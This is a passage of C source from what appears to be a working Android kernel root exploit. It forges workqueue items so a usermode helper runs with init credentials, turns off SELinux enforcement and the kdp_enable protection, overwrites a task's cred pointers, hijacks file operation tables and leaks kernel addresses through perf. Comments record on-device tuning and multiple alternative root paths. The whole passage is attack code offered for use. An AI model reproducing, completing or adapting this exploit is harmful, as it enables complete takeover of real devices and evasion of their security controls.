      }
      if (!found_off)
        pr_error("wq-umh: dfl_pwq not found\n");
      pr_success("wq-umh: dfl_pwq found at offset %zu\n", (size_t)found_off);
      dfl = rwf_read64(wq + found_off);
    }
    uint64_t pool = rwf_read64(dfl);
    if (!is_direct_ptr(pool))
      pr_error("wq-umh: bad pool\n");
    qpool = pool;
    if (rwf_read64(dfl + 8) != wq)
      pr_error("wq-umh: pwq owner mismatch\n");
    pr_info("wq-umh: wq=%016llx pwq=%016llx pool=%016llx\n",
            (unsigned long long)wq, (unsigned long long)dfl,
            (unsigned long long)pool);
    /* wait for pool idle: list empty + no active work */
    uintptr_t head_addr = pool + 0x28;
    uint32_t idle = 0;
    int wait = 200;
    for (;;) {
      uint64_t head = rwf_read64(head_addr);
      uint64_t n1 = rwf_read64(pool + 0x30);
      uint32_t active = (uint32_t)rwf_read64(pool + 0x3c);
      if (head == head_addr && n1 == head_addr && active != 0) { idle = active; break; }
      if (--wait == 0) {
        pr_error("wq-umh: pool busy (idle=%u)\n", active);
      }
      usleep(1000);
    }
    pr_info("wq-umh: pool idle (nr_idle=%u)\n", idle);
    uint32_t color = (uint32_t)rwf_read64(dfl + 0x10);
    uint32_t refcnt = (uint32_t)rwf_read64(dfl + 0x18);
    uint32_t active = (uint32_t)rwf_read64(dfl + 0x60);
    uint32_t max_active = (uint32_t)rwf_read64(wq + 0xa4);
    pr_info("wq-umh: color=%u refcnt=%u active=%u/%u\n", color, refcnt,
            active, max_active);
    if (color > 15 || refcnt == 0 || active >= max_active)
      pr_error("wq-umh: bad pwq state\n");
    uintptr_t slot = dfl + ((uintptr_t)color << 2);
    uint32_t cur = (uint32_t)rwf_read64(slot + 0x1c);
    uint8_t fw[0x60] = {0};
    memcpy(fw + 0x00, &(__uint64_t[]){(uint64_t)((dfl | 5) | ((uint64_t)color << 4))}, 8);
    memcpy(fw + 0x08, &(__uint64_t[]){(uint64_t)(head_addr)}, 8);
    memcpy(fw + 0x10, &(__uint64_t[]){(uint64_t)(head_addr)}, 8);
    memcpy(fw + 0x18, &(__uint64_t[]){(uint64_t)(func)}, 8);
    memcpy(fw + 0x20, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF)}, 8);
    /* subprocess_info fields (BTF): path@0x28, argv@0x30, envp@0x38 — all
     * full pointers into the data blob (E2E-proven: raw 0x1818 faults in
     * getname_kernel when the worker runs the work). */
    memcpy(fw + 0x28, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x20)}, 8);
    memcpy(fw + 0x30, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x68)}, 8);
    memcpy(fw + 0x38, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x78)}, 8);
    ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF, fw, sizeof(fw));
    if (!ok)
      pr_error("wq-umh: work struct write failed\n");
    pr_info("wq-umh: forged work=%016llx data=%016llx func=%016llx\n",
            (unsigned long long)(page_base + WQ_FAKE_WORK_OFF),
            (unsigned long long)(page_base + WQ_FAKE_UMH_OFF),
            (unsigned long long)func);
    /* counter writes per e: nr_in_flight[color]+=1, nr_active+=1,
     * refcnt+=1 (audit: my earlier version wrote color+1 into refcnt) */
    uint32_t cur1 = cur + 1;
    uint32_t act1 = active + 1;
    uint32_t ref1 = refcnt + 1;
    if (!rwf_phys_write(slot + 0x1c, &cur1, 4)) goto counter_fail;
    if (!rwf_phys_write(dfl + 0x60, &act1, 4)) goto counter_fail;
    if (!rwf_phys_write(dfl + 0x18, &ref1, 4)) goto counter_fail;
    if (!rwf_write64(pool + 0x30, page_base + WQ_FAKE_WORK_OFF + 8)) goto link_fail;
    if (!rwf_write64(head_addr, page_base + WQ_FAKE_WORK_OFF + 8)) goto link_fail;
    pr_info("wq-umh: queued on unbound pool (entry=%016llx)\n",
            (unsigned long long)(page_base + WQ_FAKE_WORK_OFF + 8));
    goto queued;
  }
counter_fail:
  pr_error("wq-umh: counter writes failed\n");
  goto stage_failed;
link_fail:
  pr_error("wq-umh: worklist link failed\n");
  goto stage_failed;
bound_link_fail:
  pr_warning("wq-umh: bound-pool link failed\n");
  goto pool_walk;
queued:
  pr_info("wq-umh: queued — verifying link\n");
  {
    const uintptr_t entry = page_base + WQ_FAKE_WORK_OFF + 8;
    /* verify-after-queue: pool worklist head must point at our entry and the
     * func field must still be call_usermodehelper_exec_work.  Reads past
     * the 32-slot rd-ring wrap fail hard (0 = indeterminate); only a
     * SUCCESSFUL mismatched read is a real failure → re-forge/re-link once. */
    int linked = 0, indeterminate = 0;
    for (int v = 0; v < 2 && !linked && !indeterminate; v++) {
      uint64_t wl = 0, fn = 0;
      if (!rwf_phys_read(qpool + 0x28, &wl, 8) ||
          !rwf_phys_read(page_base + WQ_FAKE_WORK_OFF + 0x18, &fn, 8)) {
        indeterminate = 1;
        pr_warning("wq-umh: link verify indeterminate (read stall — ring wrap)\n");
        break;
      }
      linked = (wl == entry && fn == (uint64_t)func);
      if (!linked && v == 0) {
        pr_warning("wq-umh: link verify failed (head=%016llx func=%016llx) — re-forge+re-link\n",
                   (unsigned long long)wl, (unsigned long long)fn);
        rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x08, qpool + 0x28);
        rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x10, qpool + 0x28);
        rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x18, (uint64_t)func);
        rwf_write64(qpool + 0x30, entry);
        rwf_write64(qpool + 0x28, entry);
      }
    }
    if (linked)
      pr_success("wq-umh: link verified\n");
    else if (!indeterminate)
      pr_warning("wq-umh: link verify failed after re-link — proceeding anyway\n");
  }
  pr_info("wq-umh: triggering via ptmx storm\n");
  /* Active trigger: forged worklist links get no wake_up_worker — the item
   * would only run when unrelated per-cpu work lands on the pool ("queued
   * but never triggered" on-device). Every 2nd poll iteration, storm ptmx
   * (the install_umh_root-proven trigger) to force system_wq activity.
   * Up to 5 outer rounds: verify the link each round; if the worker consumed
   * it without the marker appearing (exec failed), re-forge and re-queue. */
  for (int round = 1; round <= 5; round++) {
    const uintptr_t entry = page_base + WQ_FAKE_WORK_OFF + 8;
    uint64_t wl = 0;
    /* boot61's winning sequence: the first storm round consumes the link
     * without the helper running (the worker's list_del clobbers the entry's
     * list pointers / a late real queue orphans it), and only the re-queue
     * makes it execute.  Do that re-queue UNCONDITIONALLY at round 1 — the
     * writes are idempotent while the link is live, and the verify read
     * stalls once the rd ring wraps (boot71-74: verify indeterminate → no
     * re-queue → helper never ran).  Rounds 2-5 keep the read-gated form. */
    int requeue = (round == 1);
    if (!requeue && rwf_phys_read(qpool + 0x28, &wl, 8) && wl != entry)
      requeue = 1;
    if (requeue) {
      if (round != 1)
        pr_warning("wq-umh: link gone (head=%016llx) — re-queue (round %d/5)\n",
                   (unsigned long long)wl, round);
      else
        pr_info("wq-umh: unconditional re-queue (round 1/5, boot61 sequence)\n");
      rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x08, qpool + 0x28);
      rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x10, qpool + 0x28);
      rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x18, (uint64_t)func);
      rwf_write64(qpool + 0x30, entry);
      rwf_write64(qpool + 0x28, entry);
    }
    for (int i = 0; i < 20; i++) {
      if (access(gh("/.umh_rooted"), F_OK) == 0) {
        uint64_t ret = rwf_read64(page_base + WQ_FAKE_WORK_OFF + 0x44);
        pr_info("wq-umh: wake=%d complete=%u retval=%d\n", 1, 1, (int)ret);
        if (access(gh("/.umh_rooted"), F_OK) != 0)
          goto stage_failed;
        pr_success("wq-umh: helper ran with init creds\n");
        pr_success("ROOTED via wq-umh (init-creds helper)\n");
        /* arm + cfg-forge + flag repair as POST-ROOT hardening (best-effort,
         * never gates the trigger — the helper already fired, g4d is up,
         * the captures are synced; see the function's comment) */
        wq_umh_post_root_arm_repair(afd);
        wq_umh_readback();
        run_root_captures();
        return 1;
      }
      if (i & 1) {
        for (int b = 0; b < 8; b++)
          wake_system_unbound();
      }
      usleep(500000);
    }
    uint64_t ret = rwf_read64(page_base + WQ_FAKE_WORK_OFF + 0x44);
    pr_info("wq-umh: wake=%d complete=%u retval=%d (round %d/5)\n", 0, 0,
            (int)ret, round);
  }
stage_failed:
  pr_error("wq-umh: stage failed\n");
}

/* ------------------------------------------------------------------ */
/* run_rwforge — --rwforge entry point                                 */
/* ------------------------------------------------------------------ */

/* Plain route-root: single constrained-write round + connect report.
 * (factored so the land-detect retry below can repeat it) */
static int route_root_write_once(uintptr_t target, const char *label,
                                 const char *report_fmt) {
  slab_drain();
  atomic_store(&consumer_success, 0);
  do_one_write(target, label, 2);
  int conn = atomic_load(&consumer_success) > 0;
  printf(report_fmt, conn ? "connected" : "NOT connected");
  return conn;
}

/* NEW (rebuild addition, not in the lost source): land-detect retry.
 * After each write round, read the target back through the boot_id oracle
 * and repeat until task->cred/real_cred holds the armed fake-cred pointer
 * (this round's spray page CRED_COPY region) — up to 8 attempts.
 * GL_ROUTE_ROOT_SINGLESHOT=1 restores the original single-shot behavior.
 *
 * REVISED after device testing (deterministic panic): the oracle readback
 * of task pages was dropped entirely — getuid() is the land detector (it
 * reads current->real_cred->uid, i.e. the real_cred land IS the success
 * condition, zero extra kernel reads). See the plain route-root path. */

int run_rwforge(void) {
  static int filp_fd;       /* spinner's commit ioctl fd (GL_FILP_PHYSROOT) */
  static int filp_spinner;
  static uintptr_t filp_F;  /* leaked struct file */
  static uintptr_t taskphys_T;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  if (getenv("GL_NOKASLR")) {
    /* QEMU E2E boots the kernel nokaslr: slide is 0 by construction — skip
     * the oracle/perf slide detours entirely. */
    g_slide_cached = 0;
    g_slide_valid = 1;
  }
  timer_reset();

  /* W1 first */
  if (!check_selinux_off()) {
    for (int att = 1; att <= 20; att++) {
      if (check_selinux_off()) break;
      pr_info("W1 attempt %d/20\n", att);
      slab_drain();
      do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
      usleep(100000);
    }
    if (!check_selinux_off()) {
      if (getenv("GL_RWF_FASTROOT"))
        pr_warning("W1 failed — fastroot cred carries init sec blob, continuing in enforcing mode\n");
      else
        pr_error("W1 failed\n");
    }
  }
  pr_success("SELinux off\n");

  /* GL_FILP_PHYSROOT: perf-slide + file leak, arm filp-root mode, spawn the
   * spinner child that hammers the armed fd's ioctl until commit lands */
  if (getenv("GL_FILP_PHYSROOT")) {
    int64_t slide = (int64_t)perf_find_slide();
    if (slide < 0)
      pr_error("filp-physroot: slide failed\n");
    pr_info("filp-physroot: slide=%016llx\n", (unsigned long long)slide);
    int fd_a = open(ashmem_path, O_RDWR);
    int fd_b = open(ashmem_path, O_RDWR);
    filp_fd = fd_b;
    if (fd_a < 0 || fd_b < 0)
      pr_error("filp-physroot: ashmem open failed\n");
    perf_find_file(fd_b, fd_a, (uint64_t)slide);
    close(fd_a);
    if (!perf_file_ncands)
      pr_error("filp-physroot: file leak failed\n");
    uintptr_t F = perf_file_cands[0];
    if (!is_direct_ptr(F))
      pr_error("filp-physroot: file leak failed\n");
    filp_F = F;
    pr_info("filp-physroot: file=%016zx\n", F);
    fops_filp_root_mode = 1;
    fops_ioctl_override = (uint64_t)slide + (KIMAGE_TEXT_BASE + FILP_COMMIT_GADGET_OFF);
    filp_spinner = fork();
    if (filp_spinner == 0) {
      cpu_set_t spn;
      CPU_ZERO(&spn);
      CPU_SET(4, &spn);
      syscall(__NR_sched_setaffinity, 0, 8, &spn);
      time_t t0 = time(NULL);
      uint32_t suid;
      do {
        ioctl(filp_fd, 0, 0);
        suid = getuid();
      } while (suid != 0 && time(NULL) - t0 < 301);
      if (suid == 0) {
        pr_success("ROOTED via filp-physroot (spinner child)\n");
        run_root_captures();
        _exit(0);
      }
      pr_error("filp-physroot: spinner gave up\n");
    }
  }

  /* GL_TASK_PHYSROOT prefetch (used by the channel stage below) */
  if (getenv("GL_TASK_PHYSROOT")) {
    uintptr_t T = perf_find_task();
    taskphys_T = T;
    if (!T)
      pr_error("task-physroot: task leak failed\n");
    pr_info("task-physroot: task=%016zx\n", T);
  }

  if (getenv("GL_ROUTE_ROOT")) {
    pr_info("route-root: begin (no channel install)\n");

    if (getenv("GL_ROUTE_ROOT_FILP")) {
      /* route-root via fops: arm filp-root mode, slide, then the shared
       * filp-root tail (f_op swap via constrained writes) */
      pr_info("filp-root: begin\n");
      write_root_script();
      fops_filp_root_mode = 1;
      int64_t slide = (int64_t)perf_find_slide();
      if (slide < 0) {
        /* oracle slide derive: init_task.cred anchor, up to 3 reads */
        uintptr_t target = data_addr(INIT_TASK) + TASK_CRED_OFF;
        slide = -1;
  #pragma clang loop unroll(full)
      for (int att = 0; att < 3 && slide < 0; att++) {
          uint64_t v = 0;
          if (!bootid_oracle_read8(target, &v))
            continue;
          uint64_t s = v + 0x3f7e715fe8ULL;
          if ((v & 0xfff) == 0x18 &&
              s <= 0x3fffffffffULL &&
              !(s & 0x80000000001ff000ULL))
            slide = (int64_t)s;
        }
      }
      if (slide < 0)
        pr_error("filp-root: slide derive failed\n");
      route_root_filp_tail(slide);
      return 0;
    }

    if (getenv("GL_ROUTE_ROOT_COMMPROBE")) {
      route_root_commprobe();
      return 0;
    }
    if (getenv("GL_ROUTE_ROOT_COREPAT")) {
      route_root_corepat();
      return 0;
    }
    if (getenv("GL_ROUTE_ROOT_MODPROBE")) {
      route_root_modprobe();
      return 0;
    }

    /* ---- plain route-root (no channel) ---- */
    if (getenv("GL_ROUTE_ROOT_NO_KDP")) {
      pr_info("route-root: kdp write skipped (GL_ROUTE_ROOT_NO_KDP)\n");
    } else {
      /* KDP first (best-effort, marker-persisted; NO oracle readback — the
       * window at kdp_enable-8 is all-zero and a boot_id read there makes
       * proc_do_uuid write a fresh UUID into kernel .data → panic) */
      if (access(gh("/.kdp_done"), F_OK) == 0) {
        pr_info("route-root: kdp marker present\n");
      } else {
        int conn = 0;
        for (int att = 1; att <= 10 && !conn; att++) {
          slab_drain();
          atomic_store(&consumer_success, 0);
          do_one_write(data_addr(KDP_ENABLE), "W-KDP(route-root): kdp_enable=0", 1);
          conn = atomic_load(&consumer_success) >= 1;
        }
        if (conn) {
          int mfd = open(gh("/.kdp_done"), O_WRONLY | O_CREAT, 0644);
          if (mfd >= 0) close(mfd);
          pr_success("route-root: kdp write connected\n");
        } else {
          pr_warning("route-root: kdp write did not connect (continuing)\n");
        }
      }
    }
    uintptr_t own_task = 0;
    if (perf_find_task()) {
      pr_info("route-root: perf task leak used (no oracle clobber)\n");
      /* NEW (rebuild): candidate validation via comm self-test (the
       * commprobe machinery): write a recognizable pattern over
       * cand->comm (mode-3 direct value write), read /proc/self/comm —
       * a change proves the candidate IS our task AND task-page stores
       * land. Restore comm after a hit. */
      char comm_orig[17] = {0};
      int cfd = open("/proc/self/comm", O_RDONLY);
      if (cfd >= 0) {
        read(cfd, comm_orig, 16);
        close(cfd);
      }
      uint64_t testpat;
      memcpy(&testpat, "ABCDEFGH", 8);
      /* Partner filter: the true task shows up in the perf report twice —
       * once as the task pointer, once as the cand+TASK_COMM_OFF register
       * value. Only self-test candidates that have that partner; probing
       * anything else is a wild write into static kernel objects (panics). */
      int nvalid_partners = 0;
      for (int i = 0; i < perf_task_ncands && !own_task; i++) {
        uintptr_t cand = perf_task_cands[i];
        int has_partner = 0;
        for (int j = 0; j < perf_task_ncands; j++)
          if (perf_task_cands[j] == cand + (uintptr_t)TASK_COMM_OFF) {
            has_partner = 1;
            break;
          }
        if (!has_partner)
          continue;
        nvalid_partners++;
        pr_info("route-root: comm self-test cand[%d]=%016zx\n", i, cand);
        for (int t = 0; t < 2 && !own_task; t++) {
          slab_drain();
          atomic_store(&consumer_success, 0);
          rw_trigger(testpat, cand + TASK_COMM_OFF);
          int conn = atomic_load(&consumer_success) > 0;
          char now[17] = {0};
          cfd = open("/proc/self/comm", O_RDONLY);
          if (cfd >= 0) {
            read(cfd, now, 16);
            close(cfd);
          }
          pr_info("route-root: comm after cand[%d] try %d: '%s' (%s)\n",
                  i, t + 1, now, conn ? "connected" : "NOT connected");
          if (!strncmp(now, "ABCDEFGH", 8)) {
            own_task = cand;
            pr_success("route-root: candidate %d validated (comm self-test landed)\n", i);
            uint64_t orig_q = 0;
            memcpy(&orig_q, comm_orig, 8);
            slab_drain();
            atomic_store(&consumer_success, 0);
            rw_trigger(orig_q, cand + TASK_COMM_OFF);
            pr_info("route-root: comm restore %s\n",
                    atomic_load(&consumer_success) > 0 ? "connected" : "NOT connected");
          }
        }
      }
      if (!nvalid_partners)
        pr_warning("route-root: no partner-validated candidate\n");
      if (!own_task)
        pr_error("route-root: no candidate passed the comm self-test\n");
    } else {
      pr_info("route-root: perf unavailable — oracle fallback\n");
      own_task = route_find_own_task();  /* self-checked via pid==getpid() */
      if (!own_task)
        pr_error("route-root: task find failed\n");
    }
    /* NEW (rebuild): cred write pair with getuid() as the land detector —
     * getuid() reads current->real_cred->uid, so a 0 result IS the
     * real_cred land. Retry the pair up to 8 rounds; zero oracle reads.
     * GL_ROUTE_ROOT_SINGLESHOT=1: original single-shot. */
    if (getenv("GL_ROUTE_ROOT_SINGLESHOT")) {
      route_root_write_once(own_task + TASK_CRED_OFF, "route-root W2: cred",
                            "\x1b[33m[*] \x1b[0mroute-root: cred write %s\n");
      route_root_write_once(own_task + TASK_REAL_CRED_OFF, "route-root W2: real_cred",
                            "\x1b[33m[*] \x1b[0mroute-root: real_cred write %s\n");
    } else {
      for (int round = 1; round <= 8; round++) {
        route_root_write_once(own_task + TASK_CRED_OFF, "route-root W2: cred",
                              "\x1b[33m[*] \x1b[0mroute-root: cred write %s\n");
        route_root_write_once(own_task + TASK_REAL_CRED_OFF, "route-root W2: real_cred",
                              "\x1b[33m[*] \x1b[0mroute-root: real_cred write %s\n");
        uint32_t uid = getuid();
        pr_info("route-root: getuid=%d (round %d/8)\n", uid, round);
        if (uid == 0)
          break;
        pr_warning("route-root: cred pair not landed (getuid=%d) — retry %d/8\n",
                   uid, round);
      }
    }
    uint32_t uid = getuid();
    pr_info("route-root: getuid=%d\n", uid);
    if (uid != 0)
      pr_error("route-root: cred patch did not take\n");
    pr_success("ROOTED via route-only root (no channel)\n");
    run_root_captures();
    return 0;
  }

  /* GL_RWF_FASTROOT slide prime (before channel install): the fastroot path
   * needs a valid slide for the rq->curr find; derive it from init_task.cred
   * via the oracle unless GL_NO_SLIDE_PRIME or already cached */
  if (getenv("GL_RWF_FASTROOT") && !getenv("GL_NO_SLIDE_PRIME") &&
      !g_slide_valid) {
    /* init_task.stack anchor via the oracle (the cred anchor heuristic was
     * vestigial/LOST); perf fallback happens in rwf_find_task_current's
     * forge-read path */
#pragma clang loop unroll(full)
    for (int att = 1; att <= 3 && !g_slide_valid; att++) {
      int64_t slide = oracle_find_slide();
      if (slide < 0)
        continue;
      g_slide_cached = slide;
      g_slide_valid = 1;
      pr_success("fastroot: oracle slide=%016llx (attempt %d)\n",
                 (unsigned long long)slide, att);
      break;
    }
    if (!g_slide_valid)
      pr_warning("fastroot: oracle slide prime failed — forged read fallback\n");
  }

  /* ---- channel install ---- */
  rwf_pin_pipe_create();
  int afd = open_ashmem_device();
  /* fuse-bringup (perf slide + perf FILE leak) is OFF by default on this
   * target: it has never produced candidates on BZA5 (~700 failures in the
   * grind logs), each attempt costs a perf_event storm (~10-20 s/cycle and
   * a share of the pre-install attrition panics), the slide comes from the
   * boot_id ctl_table channel anchors, and the arm comes from the fdtable
   * walk.  It is ALSO a hard blocker inside an app: sepolicy denies
   * perf_event_open for untrusted_app (shell-only allow, verified against
   * the device sepolicy.bin).  GL_FUSE_BRINGUP=1 re-enables the old path. */
  if (afd >= 0 && !g_bringup_leaked && getenv("GL_FUSE_BRINGUP")) {
    if (check_selinux_off()) {
      /* fuse-bringup: leak slide + file candidates before arming */
      for (int att = 1; att <= 3; att++) {
        int64_t slide = bringup_slide();
        if (slide < 0) {
          pr_warning("fuse-bringup: perf slide failed (att %d)\n", att);
          continue;
        }
        kaslr_slide = slide;
        kaslr_done = 1;
        kaslr_base = KIMAGE_TEXT_BASE + slide;
        g_slide_cached = slide;
        g_slide_valid = 1;
        int bfd = open_ashmem_device();
        if (bfd < 0) {
          pr_warning("fuse-bringup: second ashmem open failed errno=%d\n", errno);
          break;
        }
        perf_find_file(afd, bfd, (uint64_t)slide);
        close(bfd);
        if (perf_file_ncands > 0) break;
        pr_warning("fuse-bringup: no file candidates (att %d) — retrying\n", att);
      }
    } else {
      pr_warning("fuse-bringup: leak skipped (SELinux enforcing — perf EACCES; needs W1 to land this boot)\n");
    }
    g_bringup_leaked = 1;
  }

  /* the release path of an armed file must not run the armed fops again:
   * point release (and optionally write_iter) at a noop gadget */
  fops_release_override = text_addr(KIMAGE_TEXT_BASE + NOOP_GADGET_OFF);
  if (getenv("GL_PROBE_NOOP_ITER"))
    fops_write_iter_override = text_addr(KIMAGE_TEXT_BASE + NOOP_GADGET_OFF);

  int slabs = env_int_range("GL_PIPE_SLABS", 7, 3, 15);
  pipe_drain_cnt = slabs * 16;
  pipe_reclaim_cnt = slabs * 16;

  /* reclaim the pipe_buffer array page; only high-phys pages (>= 5GB into
   * the physmap) work for the forger — retry the reclaim a few times */
  uintptr_t pb = prepare_pipe_buffer_page();
  for (int t = 1; (pb + 0x8000000000ULL) >= 0x140000000ULL; t++) {
    pr_warning("pipebuf leak out of range: %016zx (attempt %d)\n", pb, t);
    if (t >= 6)
      pr_error("pipe buffer page reclaim failed\n");
    pb = prepare_pipe_buffer_page();
  }
  pipebuf_page_base = pb;
  pr_success("pipebuf_page_base=%016zx\n", pb);

  if (!rwf_prepare_pipes())
    return 1;
  if (getenv("GL_DEFER_CLOSE"))
    pr_info("rwforge: GL_DEFER_CLOSE=1 — carrier skbs held until exit\n");
  int installed = 0;
  for (int outer = 1; outer <= 2 && !installed; outer++) {
    if (!getenv("NO_PRIME_ROUND")) {
      pr_info("rwforge: no-punch prime round\n");
      g_no_punch = 1;
      rw_trigger(0, 0);
      g_no_punch = 0;
    }
    installed = rwf_install();
    if (installed) break;
    pr_warning("rwforge install failed (outer %d/2)%s\n", outer,
               outer == 1 ? " — re-reclaiming" : "");
    if (outer == 2)
      pr_error("rwforge install failed\n");
    /* re-reclaim and retry once */
    pb = prepare_pipe_buffer_page();
    for (int t = 1; (pb + 0x8000000000ULL) >= 0x140000000ULL; t++) {
      pr_warning("pipebuf leak out of range: %016zx (attempt %d)\n", pb, t);
      if (t >= 6)
        pr_error("pipe buffer page reclaim failed\n");
      pb = prepare_pipe_buffer_page();
    }
    pipebuf_page_base = pb;
    pr_success("pipebuf_page_base=%016zx\n", pb);
    if (!rwf_prepare_pipes())
      return 1;
  }
  pr_success("rwforge channel up\n");

  /* ---- configfs arm (fuse-bringup / fuse-fix): swap a leaked file's f_op
   * to the payload configfs table, point private_data at a fake
   * configfs_buffer in the spray page, then verify the virtual write.
   * Skipped when GL_FUSE_BRINGUP is unset (perf denied on BZA5/apps — the
   * fdtable-walk arm in wq_umh_root is the device-proven path). ---- */
  if (afd >= 0 && getenv("GL_FUSE_BRINGUP")) {
    if (fake_fops && binwrite_target) {
      if (!g_bringup_leaked) {
        int64_t slide = bringup_slide();
        if (slide < 0) {
          pr_warning("fuse-bringup: perf slide failed\n");
          goto fuse_armed_out;
        }
        int bfd = open_ashmem_device();
        if (bfd < 0) {
          pr_warning("fuse-bringup: second ashmem open failed errno=%d\n", errno);
          goto fuse_armed_out2;
        }
        perf_find_file(afd, bfd, (uint64_t)slide);
        close(bfd);
      }
      if (!perf_file_ncands) {
        pr_warning("fuse-bringup: no file candidates\n");
        goto fuse_armed_out;
      }
      uintptr_t F = 0;
      uint64_t fop = 0;
      for (int i = 0; i < perf_file_ncands; i++) {
        uintptr_t cand = perf_file_cands[i];
        if (!is_direct_ptr(cand)) continue;
        fop = rwf_read64(cand + 0x10);
        if (!is_kernel_ptr(fop)) {
          pr_info("fuse-bringup: cand[%d]=%016zx not a file (slot=%016llx)\n",
                  i, cand, (unsigned long long)fop);
          continue;
        }
        F = cand;
        break;
      }
      if (!F) {
        pr_warning("fuse-bringup: no struct-file candidate passed f_op check\n");
        goto fuse_armed_out;
      }
      g_bringup_orig_fops = fop;
      pr_info("fuse-bringup: file=%016zx fops table=%016zx binwrite=%016zx\n",
              F, fake_fops, binwrite_target);
      if (!rwf_write64(F + 0x10, fake_fops)) {
        pr_warning("fuse-bringup: f_op write failed\n");
        goto fuse_armed_out;
      }
      if (getenv("GL_CFG_RESTORE"))
        g_bringup_orig_priv = rwf_read64(F + 0x20);
      g_bringup_F = F;
      pr_success("fuse-bringup: f_op swapped to payload configfs table\n");
      g_cfg_buf = page_base + 0x1140;   /* fake configfs_buffer in spray page */
      if (!rwf_write64(F + 0x20, g_cfg_buf)) {
        pr_warning("fuse-fix: private_data write failed\n");
        goto fuse_armed_out;
      }
      if (getenv("GL_CFG_NO_WRITE")) {
        pr_warning("fuse-fix: CONTROL RUN — probe pwrite + repair skipped\n");
        goto fuse_armed_out;
      }
      if (getenv("GL_CFG_PLACE_ONLY")) {
        int ok = cfg_place(binwrite_target);
        pr_warning("fuse-fix: PLACE-ONLY probe — cfg_place=%d, pwrite skipped\n", ok);
        goto fuse_armed_out2;
      }
      g_bringup_orig_fmode = (uint32_t)rwf_read64(F + 0xc);
      uint32_t fm = (uint32_t)g_bringup_orig_fmode | 0x40000;  /* FMODE_CAN_WRITE */
      if (!rwf_phys_write(F + 0xc, &fm, 4))
        pr_warning("fuse-fix: f_mode write failed\n");
      uint64_t magic = 0xF0F0F0F0DEADBEEFULL;
      errno = 0;
      if (!cfg_place(binwrite_target)) {
        pr_warning("fuse-fix: probe failed pw=%zd errno=%d seen=%016llx\n",
                   (ssize_t)-1, errno, 0ULL);
        goto fuse_armed_out2;
      }
      ssize_t pw = pwrite(afd, &magic, 8, 0);
      int perrno = errno;
      if (pw != 8) {
        pr_warning("fuse-fix: probe failed pw=%zd errno=%d seen=%016llx\n",
                   pw, perrno, 0ULL);
        goto fuse_armed_out2;
      }
      uint64_t seen = rwf_read64(binwrite_target);
      if (seen != magic) {
        pr_warning("fuse-fix: probe failed pw=%zd errno=%d seen=%016llx\n",
                   (ssize_t)8, perrno, (unsigned long long)seen);
        goto fuse_armed_out2;
      }
      pr_success("fuse-fix: payload configfs live (probe ok)\n");
      if (getenv("GL_REPAIR_VERIFY")) {
        uint32_t fm2 = (uint32_t)rwf_read64(F + 0xc) | 0x20000;  /* FMODE_CAN_READ */
        if (!rwf_phys_write(F + 0xc, &fm2, 4))
          pr_warning("fuse-fix: f_mode CAN_READ set failed\n");
      }
      int rok = rwf_repair_flags_configfs(afd);
      if (rok)
        pr_success("fuse-fix: flags repaired after install\n");
      else
        pr_warning("fuse-fix: repair failed\n");
      goto fuse_restore;
    fuse_armed_out:
    fuse_armed_out2:
      pr_warning("fuse-fix: fuse stays armed\n");
      goto fuse_restore;
    } else {
      pr_warning("fuse-bringup: payload fops table not ready\n");
      goto fuse_armed_out;
    }
  } else {
    pr_warning("fuse-fix: repair ashmem open failed errno=%d\n", errno);
  }
fuse_restore:
  if (getenv("GL_CFG_RESTORE") && g_bringup_F) {
    int ok = rwf_write64(g_bringup_F + 0x10, g_bringup_orig_fops);
    ok &= rwf_write64(g_bringup_F + 0x20, g_bringup_orig_priv);
    if (g_bringup_orig_fmode) {
      uint32_t fm = (uint32_t)g_bringup_orig_fmode;
      if (!rwf_phys_write(g_bringup_F + 0xc, &fm, 4))
        ok = 0;
    }
    if (ok)
      pr_success("fuse-fix: repair fd restored to plain ashmem (exit-safe)\n");
    else
      pr_warning("fuse-fix: fd restore PARTIAL — release may stay armed\n");
  }

  /* ---- channel-up stages ---- */
  if (getenv("GL_WQ_UMH")) {
    wq_umh_root(afd);
    return 0;
    /* NB: the forged-slot disarm runs via atexit (registered when the arm
     * lands) — every exit path incl. pr_error's exit(-1) is covered. */
  }

  if (getenv("GL_TASK_PHYSROOT")) {
    if (!getenv("GL_TP_NO_KDP")) {
      uint8_t zero = 0;
      if (rwf_phys_write(data_addr(KDP_ENABLE), &zero, 1))
        pr_success("task-physroot: kdp_enable=0 written via physrw (KDP-first)\n");
      else
        pr_warning("task-physroot: kdp_enable physrw write failed (continuing)\n");
      usleep(50000);
    }
    uintptr_t fake_cred = page_base + 0x200;
    pr_info("task-physroot: cred=%016zx task=%016zx\n", fake_cred, taskphys_T);
    if (!rwf_write64(taskphys_T + TASK_CRED_OFF, fake_cred))
      pr_error("task-physroot: cred write failed\n");
    pr_info("task-physroot: cred written (op 1)\n");
    if (!rwf_write64(taskphys_T + TASK_REAL_CRED_OFF, fake_cred))
      pr_error("task-physroot: real_cred write failed\n");
    pr_info("task-physroot: real_cred written (op 2)\n");
    uint32_t uid = getuid();
    pr_info("task-physroot: getuid=%d\n", uid);
    if (getuid() != 0)
      pr_error("task-physroot: not root (physrw store to task page dropped?)\n");
    pr_success("ROOTED via task-physroot (2 physrw cred writes)\n");
    if (getenv("GL_NO_RWF_CAPTURE")) {
      pr_info("capture skipped (GL_NO_RWF_CAPTURE)\n");
    } else {
      int cap_rc = system(CAPTURE_CMD);
      pr_info("capture rc=%d\n", cap_rc);
    }
    return 0;
  }

  if (getenv("GL_FILP_PHYSROOT")) {
    uintptr_t ns278 = data_addr(INIT_USER_NS + 0x278);
